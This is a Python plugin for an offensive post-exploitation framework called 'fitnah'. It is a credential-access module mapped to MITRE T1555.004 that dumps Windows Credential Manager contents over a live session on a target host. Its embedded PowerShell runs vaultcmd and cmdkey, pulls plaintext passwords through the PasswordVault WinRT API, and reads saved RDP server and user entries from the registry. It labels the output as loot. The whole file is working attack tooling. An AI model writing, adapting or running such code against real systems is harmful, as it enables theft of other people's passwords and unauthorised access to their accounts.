"""credential_access/vault_creds — Windows Credential Manager vault dump. MITRE T1555.004"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class VaultCreds(BasePlugin):
    NAME        = "vault_creds"
    DESCRIPTION = "Dump Windows Credential Manager (vaultcmd, PasswordVault API, cmdkey, RDP saved creds)."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1555.004"
    CATEGORY    = "credential_access"
    schema      = ParamSchema().add(
        Param("method", str, required=False, default="all",
              help="all | vaultcmd | api | cmdkey | rdp"),
    )

    @mitre("T1555.004")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        method = params.get("method", "all").lower()
        blocks = []

        if method in ("all", "vaultcmd"):
            blocks.append(
                "Write-Output '=== vaultcmd /listcreds ===';"
                "vaultcmd /listcreds:'Windows Credentials' 2>&1;"
                "vaultcmd /listcreds:'Web Credentials' 2>&1;"
            )

        if method in ("all", "api"):
            blocks.append(
                "Write-Output '';"
                "Write-Output '=== PasswordVault WinRT API ===';"
                "try {"
                "  [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] | Out-Null;"
                "  $vault=New-Object Windows.Security.Credentials.PasswordVault;"
                "  $creds=$vault.RetrieveAll();"
                "  if($creds.Count -eq 0){Write-Output 'No credentials in PasswordVault'}else{"
                "    foreach($c in $creds){"
                "      $c.RetrievePassword();"
                "      Write-Output \"Resource: $($c.Resource)  User: $($c.UserName)  Pass: $($c.Password)\""
                "    }"
                "  }"
                "} catch { Write-Output \"PasswordVault error: $_\" };"
            )

        if method in ("all", "cmdkey"):
            blocks.append(
                "Write-Output '';"
                "Write-Output '=== cmdkey /list ===';"
                "cmdkey /list 2>&1;"
            )

        if method in ("all", "rdp"):
            blocks.append(
                "Write-Output '';"
                "Write-Output '=== RDP saved credentials ===';"
                "$rdp_key='HKCU:\\Software\\Microsoft\\Terminal Server Client';"
                "Get-ChildItem \"$rdp_key\\Servers\" -EA SilentlyContinue"
                "| ForEach-Object {"
                "    $srv=$_.PSChildName;"
                "    $usr=(Get-ItemProperty $_.PSPath -EA SilentlyContinue).UsernameHint;"
                "    Write-Output \"Server: $srv  User: $usr\""
                "};"
                "Get-ItemProperty \"$rdp_key\\Default\" -EA SilentlyContinue"
                "| Select-Object -Property * -ExcludeProperty PS*"
                "| Format-List;"
            )

        ps = " ".join(blocks)
        r  = ctx.ps(ps)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err("Dispatch failed")
        return ModuleResult.ok(data=r["output"], loot_kind="creds")
